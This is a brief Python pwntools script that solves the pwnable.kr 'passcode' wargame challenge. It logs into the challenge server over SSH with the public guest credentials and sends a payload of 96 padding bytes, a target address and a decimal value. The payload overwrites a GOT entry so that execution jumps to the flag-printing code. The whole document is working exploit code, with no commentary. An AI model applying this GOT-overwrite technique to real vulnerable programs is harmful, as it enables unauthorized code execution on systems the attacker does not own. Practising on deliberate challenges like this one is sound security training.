from pwn import *


system_cat=0x804885c
passcode1=338150
passcode2=13371337

context(arch = 'i386', os = 'linux')

sh = ssh(host='pwnable.kr', user='passcode', password='guest', port=2222)
#proc=sh.interactive()
proc = sh.process('/home/passcode/passcode')
#proc = process('./passcode')
print proc.recv(1024)

pl="A"*96
pl+=p32(0x804a004)
pl+="\n"+'134514147'

print "payload", pl.encode('hex')
proc.sendline(pl)
#f=open('x','w')
#f.write(pl)
#f.close()
print proc.recv(1024)
#proc.interactive()
#print proc.recvuntil(':(')
